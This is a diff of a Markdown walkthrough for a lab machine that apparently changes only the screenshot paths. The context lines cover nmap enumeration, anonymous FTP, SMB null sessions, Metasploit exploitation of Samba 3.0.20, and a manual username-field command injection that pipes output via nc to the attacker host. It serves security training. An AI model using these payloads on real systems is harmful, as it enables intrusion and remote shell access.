@@ -35,7 +35,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.10.10.3
 ```
 
-![ping](screenshots1/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -55,7 +55,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](screenshots1/allports.png)
+![allports](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -63,7 +63,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](screenshots1/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -78,7 +78,7 @@ nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted](screenshots1/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -101,13 +101,13 @@ The FTP service allows **anonymous login**:
 ftp 10.10.10.3
 ```
 
-![ftp](screenshots1/ftp.png)
+![ftp](screenshots/ftp.png)
 
 The server accepts:
 - **User:** `anonymous`
 - **Password:** *(empty)*
 
-![ftp_enumeration](screenshots1/ftp_enumeration.png)
+![ftp_enumeration](screenshots/ftp_enumeration.png)
 
 No files of interest are available for download.  
 However, the version `vsftpd 2.3.4` is known to be backdoored (**CVE-2011-2523**).
@@ -116,7 +116,7 @@ However, the version `vsftpd 2.3.4` is known to be backdoored (**CVE-2011-2523**
 
 Search on Metasploit to check if there is any vulnerability for `vsftpd 2.3.4`:
 
-![search_vsftpd](screenshots1/search_vsftpd.png)
+![search_vsftpd](screenshots/search_vsftpd.png)
 
 Using Metasploit’s `vsftpd_234_backdoor` module:
 
@@ -128,7 +128,7 @@ set RHOSTS 10.10.10.3
 run
 ```
 
-![vsftpd_fail](screenshots1/vsftpd_fail.png)
+![vsftpd_fail](screenshots/vsftpd_fail.png)
 
 The exploit completes but fails to yield a shell, so we proceed to investigate other services.
 
@@ -141,7 +141,7 @@ We check available SMB shares using unauthenticated (null session) access:
 smbclient -L 10.10.10.3 -N
 ```
 
-![smbclient_null](screenshots1/smbclient_null.png)
+![smbclient_null](screenshots/smbclient_null.png)
 
 The `tmp` share is writable and accessible without authentication:
 
@@ -149,7 +149,7 @@ The `tmp` share is writable and accessible without authentication:
 smbclient //10.10.10.3/tmp -N
 ```
 
-![smbclient_tmp](screenshots1/smbclient_tmp.png)
+![smbclient_tmp](screenshots/smbclient_tmp.png)
 
 ---
 ## 3. Foothold
@@ -163,9 +163,9 @@ The Samba version `3.0.20-Debian` is vulnerable to the **username map script** c
 
 Search on Metasploit for Samba exploit modules:
 
-![msfconsole](screenshots1/msfconsole.png)
+![msfconsole](screenshots/msfconsole.png)
 
-![msfconsole_search_samba](screenshots1/msfconsole_search_samba.png)
+![msfconsole_search_samba](screenshots/msfconsole_search_samba.png)
 
 ---
 ### 3.2 Exploitation with Metasploit
@@ -181,7 +181,7 @@ set LPORT 4444
 run
 ```
 
-![msfconsole_samba_exploitation](screenshots1/msfconsole_samba_exploitation.png)
+![msfconsole_samba_exploitation](screenshots/msfconsole_samba_exploitation.png)
 
 A reverse shell is obtained **directly as root**.
 
@@ -194,7 +194,7 @@ stty raw -echo; fg
 reset xterm
 ```
 
-![configure_bash](screenshots1/configure_bash.png)
+![configure_bash](screenshots/configure_bash.png)
 
 ---
 ### 3.3 Understanding and Manually Exploiting the Samba Vulnerability
@@ -206,7 +206,7 @@ searchsploit "Samba 3.0.20"
 searchsploit -m unix/remote/16320.rb
 ```
 
-![searchsploit_samba_download](screenshots1/searchsploit_samba_download.png)
+![searchsploit_samba_download](screenshots/searchsploit_samba_download.png)
 
 The file contains:
 ```ruby
@@ -319,7 +319,7 @@ Then execute:
 logon "/=`nohup ping -c 1 10.10.10.3 | nc 10.10.14.3 443`"
 ```
 
-![manually_exploitation_ping](screenshots1/manually_exploitation_ping.png)
+![manually_exploitation_ping](screenshots/manually_exploitation_ping.png)
 
 We receive a ping in our terminal, so let’s execute the exploit manually by modifying the payload to open a reverse shell:
 
@@ -333,7 +333,7 @@ Once connected, confirm root access:
 whoami
 ```
 
-![manually_exploitation_bash](screenshots1/manually_exploitation_bash.png)
+![manually_exploitation_bash](screenshots/manually_exploitation_bash.png)
 
 ---
 ## 4. Post-Exploitation (Automatic exploitation continuation)
@@ -344,7 +344,7 @@ Retrieve the **user flag**:
 cat /home/makis/user.txt
 ```
 
-![user_flag](screenshots1/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 Retrieve the **root flag**:
 
@@ -352,7 +352,7 @@ Retrieve the **root flag**:
 cat /root/root.txt
 ```
 
-![root_flag](screenshots1/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ✅ **Machine pwned directly as root** — no privilege escalation required.
 
